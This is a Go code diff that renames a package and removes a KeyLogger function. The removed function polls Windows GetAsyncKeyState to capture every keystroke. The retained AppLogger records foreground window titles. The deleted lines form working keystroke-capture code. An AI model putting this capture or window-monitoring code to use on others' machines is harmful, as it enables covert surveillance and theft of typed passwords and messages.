@@ -1,4 +1,4 @@
-package Listener
+package Application
 
 import (
 	"syscall"
@@ -6,11 +6,14 @@ import (
 	"unsafe"
 )
 
+type Application struct {
+	App      string
+	DateTime time.Time
+}
+
 var (
-	user32                  = syscall.NewLazyDLL("user32.dll")
-	procGetAsyncKeyState    = user32.NewProc("GetAsyncKeyState")
-	procGetForegroundWindow = user32.NewProc("GetForegroundWindow")
-	procGetWindowTextW      = user32.NewProc("GetWindowTextW")
+	procGetForegroundWindow = syscall.NewLazyDLL("user32.dll").NewProc("GetForegroundWindow")
+	procGetWindowTextW      = syscall.NewLazyDLL("user32.dll").NewProc("GetWindowTextW")
 )
 
 func AppLogger(ch chan string) {
@@ -47,18 +50,4 @@ func AppLogger(ch chan string) {
 		tmp = window
 		time.Sleep(1 * time.Millisecond)
 	}
-}
-
-func KeyLogger(ch chan string) {
-	for {
-		time.Sleep(50 * time.Millisecond)
-		for i := 0; i < 0xFF; i++ {
-			async, _, _ := procGetAsyncKeyState.Call(uintptr(i))
-			if async&0x1 == 0 {
-				continue
-			}
-			ch <- string(i)
-		}
-	}
-
 }
